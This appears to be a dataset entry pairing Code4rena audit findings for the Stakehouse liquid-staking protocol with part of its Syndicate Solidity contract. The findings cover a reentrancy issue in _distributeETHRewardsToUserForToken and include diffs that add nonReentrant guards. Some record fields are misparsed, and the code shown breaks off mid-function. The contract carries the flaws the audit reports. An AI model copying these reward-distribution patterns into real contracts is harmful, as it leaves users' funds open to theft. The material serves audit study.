                "Repair": "\nReduce claimed[] when necessary on the from side when GiantMevAndFeesPool tokens are transferred. Alternatively, claimed[] could be calculated on a per share basis rather than a total basis in order to simplify some of the adjustments that must be made in the code for claimed[].\n\nvince0656 (Stakehouse) confirmed(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/178)\n\n\n\n*\n\n\n"
            },
            {
                "Name": "H-20",
                "Location": [
                    "_distributeETHRewardsToUserForToken"
                ],
                "Type": " Possibly reentrancy attacks in  _distributeETHRewardsToUserForToken  function",
                "Description": "*Submitted by rotcivegaf(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/328), also found by datapunk(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/414), 0x4non(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/341), and clems4ever(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/35)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L73<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340\n\nThe root of the problem is in the _distributeETHRewardsToUserForToken which makes a call to distribute the ether rewards. With this call, the recipient can execute an reentrancy attack calling several times the different function to steal founds or take advantage of other users/protocol.\n\n\nThis functions use the _distributeETHRewardsToUserForToken:\n\n##\n",
                "Repair": ""
            },
            {
                "Name": "withdrawLPTokens`, **GiantPoolBase** contract",
                "Location": [
                    "_onWithdraw",
                    "_distributeETHRewardsToUserForToken"
                ],
                "Type": "(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90):",
                "Description": "\nThe possibility of the reentrancy is given when call function _onWithdraw(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L74), this function implemented in GiantMevAndFeesPool contract(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L181-L193) uses _distributeETHRewardsToUserForToken and this one call the recipient making the possibility of the reentrancy, breaking the code of L76-L89(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L76-L89)\n\n##\n",
                "Repair": ""
            },
            {
                "Name": "batchDepositETHForStaking`, **StakingFundsVault** contract",
                "Location": [
                    "_distributeETHRewardsToUserForToken"
                ],
                "Type": "(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104):",
                "Description": "\nThe possibility of the reentrancy is given when call function _distributeETHRewardsToUserForToken(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L88-L93), this function call the recipient making the possibility of the reentrancy, breaking the code of L76-L89(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L96-L107)\n\n##\n",
                "Repair": ""
            },
            {
                "Name": "depositETHForStaking`, **StakingFundsVault** contract",
                "Location": [
                    "_distributeETHRewardsToUserForToken"
                ],
                "Type": "(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143):",
                "Description": "\nThe possibility of the reentrancy is given when call function _distributeETHRewardsToUserForToken(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L128-L133), this function call the recipient making the possibility of the reentrancy, breaking the code of L136-L142(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L136-L142)\n\n##\n",
                "Repair": ""
            },
            {
                "Name": "beforeTokenTransfer`, **StakingFundsVault** contract",
                "Location": [
                    "_distributeETHRewardsToUserForToken"
                ],
                "Type": "(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340):",
                "Description": "\nThe possibility of the reentrancy is given when call function _distributeETHRewardsToUserForToken in L333(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L333) and L337(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L337), this function call the recipient making the possibility of the reentrancy, breaking the code of L343-L351(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L343-L351)\n\n",
                "Repair": "\nOne possibility is to wrap(deposit) ether in WETH and transfer as ERC20 token.\n\nAnother is to add nonReentrant guard to the functions:\n\n*   beforeTokenTransfer, GiantMevAndFeesPool contract(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167)\n*   withdrawLPTokens, GiantPoolBase contract(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90)\n*   batchDepositETHForStaking, StakingFundsVault contract(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104)\n*   depositETHForStaking, StakingFundsVault contract(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143)\n*   beforeTokenTransfer, StakingFundsVault contract(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340)\n\ndiff\nFile: contracts/liquid-staking/GiantMevAndFeesPool.sol\n\n@@ -143,7 +143,7 @@ contract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, Syndicate\n     }\n\n     /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n   function beforeTokenTransfer(address _from, address _to, uint256) external {\n+    function beforeTokenTransfer(address _from, address _to, uint256) external nonReentrant {\n         require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n         updateAccumulatedETHPerLP();\n\n\ndiff\nFile: contracts/liquid-staking/GiantPoolBase.sol\n\n@@ -66,7 +66,7 @@ contract GiantPoolBase is ReentrancyGuard {\n     /// @notice Allow a user to chose to withdraw vault LP tokens by burning their giant LP tokens. 1 Giant LP == 1 vault LP\n     /// @param _lpTokens List of LP tokens being owned and being withdrawn from the giant pool\n     /// @param _amounts List of amounts of giant LP being burnt in exchange for vault LP\n   function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external {\n+    function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external nonReentrant {\n         uint256 amountOfTokens = _lpTokens.length;\n         require(amountOfTokens  0, \"Empty arrays\");\n         require(amountOfTokens == _amounts.length, \"Inconsistent array lengths\");\n\n\ndiff\nFile: contracts/liquid-staking/StakingFundsVault.sol\n\n@@ -66,7 +66,7 @@ contract StakingFundsVault is\n     /// @notice Batch deposit ETH for staking against multiple BLS public keys\n     /// @param _blsPublicKeyOfKnots List of BLS public keys being staked\n     /// @param _amounts Amounts of ETH being staked for each BLS public key\n   function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable {\n+    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable nonReentrant {\n         uint256 numOfValidators = _blsPublicKeyOfKnots.length;\n         require(numOfValidators  0, \"Empty arrays\");\n         require(numOfValidators == _amounts.length, \"Inconsistent array lengths\");\n\n@@ -110,7 +110,7 @@ contract StakingFundsVault is\n     /// @notice Deposit ETH against a BLS public key for staking\n     /// @param _blsPublicKeyOfKnot BLS public key of validator registered by a node runner\n     /// @param _amount Amount of ETH being staked\n   function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable returns (uint256) {\n+    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable nonReentrant returns (uint256) {\n         require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key is banned or not a part of LSD network\");\n         require(\n             getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n\n@@ -312,7 +312,7 @@ contract StakingFundsVault is\n     }\n\n     /// @notice before an LP token is transferred, pay the user any unclaimed ETH rewards\n   function beforeTokenTransfer(address _from, address _to, uint256) external override {\n+    function beforeTokenTransfer(address _from, address _to, uint256) external override nonReentrant {\n         address syndicate = liquidStakingNetworkManager.syndicate();\n         if (syndicate != address(0)) {\n             LPToken token = LPToken(msg.sender);\n\n\nvince0656 (Stakehouse) confirmed(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/328#issuecomment-1329416775)\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { Initializable } from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { Ownable } from \"@openzeppelin/contracts/access/Ownable.sol\";\nimport { ReentrancyGuard } from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport { ISyndicateInit } from \"../interfaces/ISyndicateInit.sol\";\nimport {\n    ZeroAddress,\n    EmptyArray,\n    InconsistentArrayLengths,\n    InvalidBLSPubKey,\n    InvalidNumberOfCollateralizedOwners,\n    KnotSlashed,\n    FreeFloatingStakeAmountTooSmall,\n    KnotIsNotRegisteredWithSyndicate,\n    NotPriorityStaker,\n    KnotIsFullyStakedWithFreeFloatingSlotTokens,\n    InvalidStakeAmount,\n    KnotIsNotAssociatedWithAStakeHouse,\n    UnableToStakeFreeFloatingSlot,\n    NothingStaked,\n    TransferFailed,\n    NotCollateralizedOwnerAtIndex,\n    InactiveKnot,\n    DuplicateArrayElements,\n    KnotIsAlreadyRegistered,\n    KnotHasAlreadyBeenDeRegistered\n} from \"./SyndicateErrors.sol\";\n\n/// @notice Syndicate registry and funds splitter for EIP1559 execution layer transaction tips across SLOT shares\n/// @dev This contract can be extended to allow lending and borrowing of time slots for borrower to redeem any revenue generated within the specified window\ncontract Syndicate is ISyndicateInit, Initializable, Ownable, ReentrancyGuard, StakehouseAPI {\n\n    /// @notice Emitted when the contract is initially deployed\n    event ContractDeployed();\n\n    /// @notice Emitted when accrued ETH per SLOT share type is updated\n    event UpdateAccruedETH(uint256 unprocessed);\n\n    /// @notice Emitted when new collateralized SLOT owners for a knot prompts re-calibration\n    event CollateralizedSLOTReCalibrated(bytes BLSPubKey);\n\n    /// @notice Emitted when a new KNOT is associated with the syndicate contract\n    event KNOTRegistered(bytes BLSPubKey);\n\n    /// @notice Emitted when a KNOT is de-registered from the syndicate\n    event KnotDeRegistered(bytes BLSPubKey);\n\n    /// @notice Emitted when a priority staker is added to the syndicate\n    event PriorityStakerRegistered(address indexed staker);\n\n    /// @notice Emitted when a user stakes free floating sETH tokens\n    event Staked(bytes BLSPubKey, uint256 amount);\n\n    /// @notice Emitted when a user unstakes free floating sETH tokens\n    event UnStaked(bytes BLSPubKey, uint256 amount);\n\n    /// @notice Emitted when either an sETH staker or collateralized SLOT owner claims ETH\n    event ETHClaimed(bytes BLSPubKey, address indexed user, address recipient, uint256 claim, bool indexed isCollateralizedClaim);\n\n    /// @notice Precision used in rewards calculations for scaling up and down\n    uint256 public constant PRECISION = 1e24;\n\n    /// @notice Total accrued ETH per free floating share for new and old stakers\n    uint256 public accumulatedETHPerFreeFloatingShare;\n\n    /// @notice Total accrued ETH for all collateralized SLOT holders per knot which is then distributed based on individual balances\n    uint256 public accumulatedETHPerCollateralizedSlotPerKnot;\n\n    /// @notice Last cached highest seen balance for all collateralized shares\n    uint256 public lastSeenETHPerCollateralizedSlotPerKnot;\n\n    /// @notice Last cached highest seen balance for all free floating shares\n    uint256 public lastSeenETHPerFreeFloating;\n\n    /// @notice Total number of sETH token shares staked across all houses\n    uint256 public totalFreeFloatingShares;\n\n    /// @notice Total amount of ETH drawn down by syndicate beneficiaries regardless of SLOT type\n    uint256 public totalClaimed;\n\n    /// @notice Number of knots registered with the syndicate which can be across any house\n    uint256 public numberOfRegisteredKnots;\n\n    /// @notice Informational - is the knot registered to this syndicate or not - the node should point to this contract\n    mapping(bytes => bool) public isKnotRegistered;\n\n    /// @notice Block number after which if there are sETH staking slots available, it can be supplied by anyone on the market\n    uint256 public priorityStakingEndBlock;\n\n    /// @notice Syndicate deployer can highlight addresses that get priority for staking free floating house sETH up to a certain block before anyone can do it\n    mapping(address => bool) public isPriorityStaker;\n\n    /// @notice Total amount of free floating sETH staked\n    mapping(bytes => uint256) public sETHTotalStakeForKnot;\n\n    /// @notice Amount of sETH staked by user against a knot\n    mapping(bytes => mapping(address => uint256)) public sETHStakedBalanceForKnot;\n\n    /// @notice Amount of ETH claimed by user from sETH staking\n    mapping(bytes => mapping(address => uint256)) public sETHUserClaimForKnot;\n\n    /// @notice Total amount of ETH that has been allocated to the collateralized SLOT owners of a KNOT\n    mapping(bytes => uint256) public totalETHProcessedPerCollateralizedKnot;\n\n    /// @notice Total amount of ETH accrued for the collateralized SLOT owner of a KNOT\n    mapping(bytes => mapping(address => uint256)) public accruedEarningPerCollateralizedSlotOwnerOfKnot;\n\n    /// @notice Total amount of ETH claimed by the collateralized SLOT owner of a KNOT\n    mapping(bytes => mapping(address => uint256)) public claimedPerCollateralizedSlotOwnerOfKnot;\n\n    /// @notice Whether a BLS public key, that has been previously registered, is no longer part of the syndicate and its shares (free floating or SLOT) cannot earn any more rewards\n    mapping(bytes => bool) public isNoLongerPartOfSyndicate;\n\n    /// @notice Once a BLS public key is no longer part of the syndicate, the accumulated ETH per free floating SLOT share is snapshotted so historical earnings can be drawn down correctly\n    mapping(bytes => uint256) public lastAccumulatedETHPerFreeFloatingShare;\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() initializer {}\n\n    /// @param _contractOwner Ethereum public key that will receive management rights of the contract\n    /// @param _priorityStakingEndBlock Block number when priority sETH staking ends and anyone can stake\n    /// @param _priorityStakers Optional list of addresses that will have priority for staking sETH against each knot registered\n    /// @param _blsPubKeysForSyndicateKnots List of BLS public keys of Stakehouse protocol registered KNOTs participating in syndicate\n    function initialize(\n        address _contractOwner,\n        uint256 _priorityStakingEndBlock,\n        address[] memory _priorityStakers,\n        bytes[] memory _blsPubKeysForSyndicateKnots\n    ) external virtual override initializer {\n        _initialize(\n            _contractOwner,\n            _priorityStakingEndBlock,\n            _priorityStakers,\n            _blsPubKeysForSyndicateKnots\n        );\n    }\n\n    /// @notice Allows the contract owner to append to the list of knots that are part of the syndicate\n    /// @param _newBLSPublicKeyBeingRegistered List of BLS public keys being added to the syndicate\n    function registerKnotsToSyndicate(\n        bytes[] calldata _newBLSPublicKeyBeingRegistered\n    ) external onlyOwner {\n        // update accrued ETH per SLOT type\n        updateAccruedETHPerShares();\n        _registerKnotsToSyndicate(_newBLSPublicKeyBeingRegistered);\n    }\n\n    /// @notice Make knot shares of a registered list of BLS public keys inactive - the action cannot be undone and no further ETH accrued\n    function deRegisterKnots(bytes[] calldata _blsPublicKeys) external onlyOwner {\n        updateAccruedETHPerShares();\n        _deRegisterKnots(_blsPublicKeys);\n    }\n\n    /// @notice Allows the contract owner to append to the list of priority sETH stakers\n    /// @param _priorityStakers List of staker addresses eligible for sETH staking\n    function addPriorityStakers(address[] calldata _priorityStakers) external onlyOwner {\n        updateAccruedETHPerShares();\n        _addPriorityStakers(_priorityStakers);\n    }\n\n    /// @notice Should this block be in the future, it means only those listed in the priority staker list can stake sETH\n    /// @param _endBlock Arbitrary block number after which anyone can stake up to 4 SLOT in sETH per KNOT\n    function updatePriorityStakingBlock(uint256 _endBlock) external onlyOwner {\n        updateAccruedETHPerShares();\n        priorityStakingEndBlock = _endBlock;\n    }\n\n    /// @notice Update accrued ETH per SLOT share without distributing ETH as users of the syndicate individually pull funds\n    function updateAccruedETHPerShares() public {\n        // Ensure there are registered KNOTs. Syndicates are deployed with at least 1 registered but this can fall to zero.\n        // Fee recipient should be re-assigned in the event that happens as any further ETH can be collected by owner\n        if (numberOfRegisteredKnots > 0) {\n            // All time, total ETH that was earned per slot type (free floating or collateralized)\n            uint256 totalEthPerSlotType = calculateETHForFreeFloatingOrCollateralizedHolders();\n\n            // Process free floating if there are staked shares\n            uint256 freeFloatingUnprocessed;\n            if (totalFreeFloatingShares > 0) {\n                freeFloatingUnprocessed = getUnprocessedETHForAllFreeFloatingSlot();\n                accumulatedETHPerFreeFloatingShare += _calculateNewAccumulatedETHPerFreeFloatingShare(freeFloatingUnprocessed);\n                lastSeenETHPerFreeFloating = totalEthPerSlotType;\n            }\n\n            uint256 collateralizedUnprocessed = ((totalEthPerSlotType - lastSeenETHPerCollateralizedSlotPerKnot) / numberOfRegisteredKnots);\n            accumulatedETHPerCollateralizedSlotPerKnot += collateralizedUnprocessed;\n            lastSeenETHPerCollateralizedSlotPerKnot = totalEthPerSlotType;\n\n            emit UpdateAccruedETH(freeFloatingUnprocessed + collateralizedUnprocessed);\n        } else {\n            // todo - check else case for any ETH lost\n        }\n    }\n\n    /// @notice Stake up to 4 collateralized SLOT worth of sETH per KNOT to get a portion of syndicate rewards\n    /// @param _blsPubKeys List of BLS public keys for KNOTs registered with the syndicate\n    /// @param _sETHAmounts Per BLS public key, the total amount of sETH that will be staked (up to 4 collateralized SLOT per KNOT)\n    /// @param _onBehalfOf Allows a caller to specify an address that will be assigned stake ownership and rights to claim\n    function stake(bytes[] calldata _blsPubKeys, uint256[] calldata _sETHAmounts, address _onBehalfOf) external {\n        if (_blsPubKeys.length == 0) revert EmptyArray();\n        if (_blsPubKeys.length != _sETHAmounts.length) revert InconsistentArrayLengths();\n        if (_onBehalfOf == address(0)) revert ZeroAddress();\n\n        // Make sure we have the latest accrued information\n        updateAccruedETHPerShares();\n\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            bytes memory _blsPubKey = _blsPubKeys[i];\n            uint256 _sETHAmount = _sETHAmounts[i];\n\n            if (_sETHAmount < 1 gwei) revert FreeFloatingStakeAmountTooSmall();\n            if (!isKnotRegistered[_blsPubKey] || isNoLongerPartOfSyndicate[_blsPubKey]) revert KnotIsNotRegisteredWithSyndicate();\n\n            if (block.number < priorityStakingEndBlock && !isPriorityStaker[_onBehalfOf]) revert NotPriorityStaker();\n\n            uint256 totalStaked = sETHTotalStakeForKnot[_blsPubKey];\n            if (totalStaked == 12 ether) revert KnotIsFullyStakedWithFreeFloatingSlotTokens();\n\n            if (_sETHAmount + totalStaked > 12 ether) revert InvalidStakeAmount();\n\n            totalFreeFloatingShares += _sETHAmount;\n            sETHTotalStakeForKnot[_blsPubKey] += _sETHAmount;\n            sETHStakedBalanceForKnot[_blsPubKey][_onBehalfOf] += _sETHAmount;\n            sETHUserClaimForKnot[_blsPubKey][_onBehalfOf] = (_sETHAmount * accumulatedETHPerFreeFloatingShare) / PRECISION;\n\n            (address stakeHouse,,,,,) = getStakeHouseUniverse().stakeHouseKnotInfo(_blsPubKey);\n            if (stakeHouse == address(0)) revert KnotIsNotAssociatedWithAStakeHouse();\n            IERC20 sETH = IERC20(getSlotRegistry().stakeHouseShareTokens(stakeHouse));\n            bool transferResult = sETH.transferFrom(msg.sender, address(this), _sETHAmount);\n            if (!transferResult) revert UnableToStakeFreeFloatingSlot();\n\n            emit Staked(_blsPubKey, _sETHAmount);\n        }\n    }\n\n    /// @notice Unstake an sETH position against a particular KNOT and claim ETH on exit\n    /// @param _unclaimedETHRecipient The address that will receive any unclaimed ETH received to the syndicate\n    /// @param _sETHRecipient The address that will receive the sETH that is being unstaked\n    /// @param _blsPubKeys List of BLS public keys for KNOTs registered with the syndicate\n    /// @param _sETHAmounts Per BLS public key, the total amount of sETH that will be unstaked\n    function unstake(\n        address _unclaimedETHRecipient,\n        address _sETHRecipient,\n        bytes[] calldata _blsPubKeys,\n        uint256[] calldata _sETHAmounts\n    ) external nonReentrant {\n        if (_blsPubKeys.length == 0) revert EmptyArray();\n        if (_blsPubKeys.length != _sETHAmounts.length) revert InconsistentArrayLengths();\n        if (_unclaimedETHRecipient == address(0)) revert ZeroAddress();\n        if (_sETHRecipient == address(0)) revert ZeroAddress();\n\n        // Claim all ETH owed before unstaking but even if nothing is owed `updateAccruedETHPerShares` will be called\n        _claimAsStaker(_unclaimedETHRecipient, _blsPubKeys);\n\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            bytes memory _blsPubKey = _blsPubKeys[i];\n            uint256 _sETHAmount = _sETHAmounts[i];\n            if (sETHStakedBalanceForKnot[_blsPubKey][msg.sender] < _sETHAmount) revert NothingStaked();\n\n            (address stakeHouse,,,,,) = getStakeHouseUniverse().stakeHouseKnotInfo(_blsPubKey);\n            IERC20 sETH = IERC20(getSlotRegistry().stakeHouseShareTokens(stakeHouse));\n\n            // Only decrease totalFreeFloatingShares in the event that the knot is still active in the syndicate\n            if (!isNoLongerPartOfSyndicate[_blsPubKey]) {\n                totalFreeFloatingShares -= _sETHAmount;\n            }\n\n            sETHTotalStakeForKnot[_blsPubKey] -= _sETHAmount;\n            sETHStakedBalanceForKnot[_blsPubKey][msg.sender] -= _sETHAmount;\n\n            bool transferResult = sETH.transfer(_sETHRecipient, _sETHAmount);\n            if (!transferResult) revert TransferFailed();\n\n            emit UnStaked(_blsPubKey, _sETHAmount);\n        }\n    }\n\n    /// @notice Claim ETH cashflow from the syndicate as an sETH staker proportional to how much the user has staked\n    /// @param _recipient Address that will receive the share of ETH funds\n    /// @param _blsPubKeys List of BLS public keys that the caller has staked against\n    function claimAsStaker(address _recipient, bytes[] calldata _blsPubKeys) public nonReentrant {\n        _claimAsStaker(_recipient, _blsPubKeys);\n    }\n\n    /// @param _blsPubKeys List of BLS public keys that the caller has staked against\n    function claimAsCollateralizedSLOTOwner(\n        address _recipient,\n        bytes[] calldata _blsPubKeys\n    ) external nonReentrant {\n        if (_blsPubKeys.length == 0) revert EmptyArray();\n        if (_recipient == address(0)) revert ZeroAddress();\n        if (_recipient == address(this)) revert ZeroAddress();\n\n        // Make sure we have the latest accrued information for all shares\n        updateAccruedETHPerShares();\n\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            bytes memory _blsPubKey = _blsPubKeys[i];\n            if (!isKnotRegistered[_blsPubKey]) revert KnotIsNotRegisteredWithSyndicate();\n\n            // process newly accrued ETH and distribute it to collateralized SLOT owners for the given knot\n            _updateCollateralizedSlotOwnersLiabilitySnapshot(_blsPubKey);\n\n            // Calculate total amount of unclaimed ETH\n            uint256 userShare = accruedEarningPerCollateralizedSlotOwnerOfKnot[_blsPubKey][msg.sender];\n\n            // This is designed to cope with falling SLOT balances i.e. when collateralized SLOT is burnt after applying penalties\n            uint256 unclaimedUserShare = userShare - claimedPerCollateralizedSlotOwnerOfKnot[_blsPubKey][msg.sender];\n\n            // Send ETH to the user if there is an unclaimed amount\n            if (unclaimedUserShare > 0) {\n                // Increase total claimed and claimed at the user level\n                totalClaimed += unclaimedUserShare;\n                claimedPerCollateralizedSlotOwnerOfKnot[_blsPubKey][msg.sender] = userShare;\n\n                // Send ETH to user\n                (bool success,) = _recipient.call{value: unclaimedUserShare}(\"\");\n                if (!success) revert TransferFailed();\n\n                emit ETHClaimed(\n                    _blsPubKey,\n                    msg.sender,\n                    _recipient,\n                    unclaimedUserShare,\n                    true\n                );\n            }\n        }\n    }\n\n    /// @notice For any new ETH received by the syndicate, at the knot level allocate ETH owed to each collateralized owner\n    /// @param _blsPubKey BLS public key relating to the collateralized owners that need updating\n    function updateCollateralizedSlotOwnersAccruedETH(bytes memory _blsPubKey) external {\n        _updateCollateralizedSlotOwnersLiabilitySnapshot(_blsPubKey);\n    }\n\n    /// @notice For any new ETH received by the syndicate, at the knot level allocate ETH owed to each collateralized owner and do it for a batch of knots\n    /// @param _blsPubKeys List of BLS public keys related to the collateralized owners that need updating\n    function batchUpdateCollateralizedSlotOwnersAccruedETH(bytes[] memory _blsPubKeys) external {\n        uint256 numOfKeys = _blsPubKeys.length;\n        if (numOfKeys == 0) revert EmptyArray();\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            _updateCollateralizedSlotOwnersLiabilitySnapshot(_blsPubKeys[i]);\n        }\n    }\n\n    /// @notice Syndicate contract can receive ETH\n    receive() external payable {\n        // No logic here because one cannot assume that more than 21K GAS limit is forwarded\n    }\n\n    /// @notice Calculate the amount of unclaimed ETH for a given BLS publice key + free floating SLOT staker without factoring in unprocessed rewards\n    /// @param _blsPubKey BLS public key of the KNOT that is registered with the syndicate\n    /// @param _user The address of a user that has staked sETH against the BLS public key\n    function calculateUnclaimedFreeFloatingETHShare(bytes memory _blsPubKey, address _user) public view returns (uint256) {\n        // Check the user has staked sETH for the KNOT\n        uint256 stakedBal = sETHStakedBalanceForKnot[_blsPubKey][_user];\n        if (stakedBal < 1 gwei) revert FreeFloatingStakeAmountTooSmall();\n\n        // Get the amount of ETH eligible for the user based on their staking amount\n        uint256 accumulatedETHPerShare = _getCorrectAccumulatedETHPerFreeFloatingShareForBLSPublicKey(_blsPubKey);\n        uint256 userShare = (accumulatedETHPerShare * stakedBal) / PRECISION;\n\n        // Calculate how much their unclaimed share of ETH is based on total ETH claimed so far\n        return userShare - sETHUserClaimForKnot[_blsPubKey][_user];\n    }\n\n    /// @notice Using `highestSeenBalance`, this is the amount that is separately allocated to either free floating or collateralized SLOT holders\n    function calculateETHForFreeFloatingOrCollateralizedHolders() public view returns (uint256) {\n        // Get total amount of ETH that can be drawn down by all SLOT holders associated with a knot\n        uint256 ethPerKnot = totalETHReceived();\n\n        // Get the amount of ETH eligible for free floating sETH or collateralized SLOT stakers\n        return ethPerKnot / 2;\n    }\n\n    /// @notice Preview the amount of unclaimed ETH available for an sETH staker against a KNOT which factors in unprocessed rewards from new ETH sent to contract\n    /// @param _blsPubKey BLS public key of the KNOT that is registered with the syndicate\n    /// @param _staker The address of a user that has staked sETH against the BLS public key\n    function previewUnclaimedETHAsFreeFloatingStaker(\n        address _staker,\n        bytes calldata _blsPubKey\n    ) external view returns (uint256) {\n        uint256 currentAccumulatedETHPerFreeFloatingShare = accumulatedETHPerFreeFloatingShare;\n        uint256 updatedAccumulatedETHPerFreeFloatingShare =\n                            currentAccumulatedETHPerFreeFloatingShare + calculateNewAccumulatedETHPerFreeFloatingShare();\n\n        uint256 stakedBal = sETHStakedBalanceForKnot[_blsPubKey][_staker];\n        uint256 userShare = (updatedAccumulatedETHPerFreeFloatingShare * stakedBal) / PRECISION;\n\n        return userShare - sETHUserClaimForKnot[_blsPubKey][_staker];\n    }\n\n    /// @notice Preview the amount of unclaimed ETH available for a collatearlized SLOT staker against a KNOT which factors in unprocessed rewards from new ETH sent to contract\n    /// @param _staker Address of a collateralized SLOT owner for a KNOT\n    /// @param _blsPubKey BLS public key of the KNOT that is registered with the syndicate\n    function previewUnclaimedETHAsCollateralizedSlotOwner(\n        address _staker,\n        bytes calldata _blsPubKey\n    ) external view returns (uint256) {\n        // Per collateralized SLOT per KNOT before distributing to individual collateralized owners\n        uint256 accumulatedSoFar = accumulatedETHPerCollateralizedSlotPerKnot\n                    + ((calculateETHForFreeFloatingOrCollateralizedHolders() - lastSeenETHPerCollateralizedSlotPerKnot) / numberOfRegisteredKnots);\n\n        uint256 unprocessedForKnot = accumulatedSoFar - totalETHProcessedPerCollateralizedKnot[_blsPubKey];\n\n        // Fetch information on what has been processed so far against the ECDSA address of the collateralized SLOT owner\n        uint256 currentAccrued = accruedEarningPerCollateralizedSlotOwnerOfKnot[_blsPubKey][_staker];\n\n        // Fetch information about the knot including total slashed amount\n        uint256 currentSlashedAmount = getSlotRegistry().currentSlashedAmountOfSLOTForKnot(_blsPubKey);\n        uint256 numberOfCollateralisedSlotOwnersForKnot = getSlotRegistry().numberOfCollateralisedSlotOwnersForKnot(_blsPubKey);\n        